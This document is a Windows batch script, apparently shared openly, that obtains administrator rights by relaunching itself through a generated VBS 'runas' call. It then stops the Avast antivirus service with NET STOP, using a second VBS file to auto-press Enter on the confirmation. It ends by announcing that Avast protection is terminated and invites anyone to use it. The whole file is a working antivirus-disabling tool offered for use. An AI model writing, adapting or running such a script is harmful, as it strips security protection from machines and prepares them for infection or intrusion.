@ECHO OFF
::Created by equin0x
::www.github.com/equin0x/gen
::UAC Prompt credits all go to STACKOVERFLOW.COM
::I'm not much of a vbs guy so all of the uac prompt code goes to the guys over there.
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )



:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    exit /B

    
    
:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

(
	ECHO Set Shell = WScript.CreateObject^("WScript.Shell"^)
	ECHO Wscript.Sleep 200
	ECHO Shell.SendKeys^("{ENTER}"^)
	
)>%TEMP%\Keys.vbs
NET STOP "avast! Antivirus"
start %temp%\Keys.VBS
ECHO Avast protection has been terminated.
ECHO Feel free to use this however you like.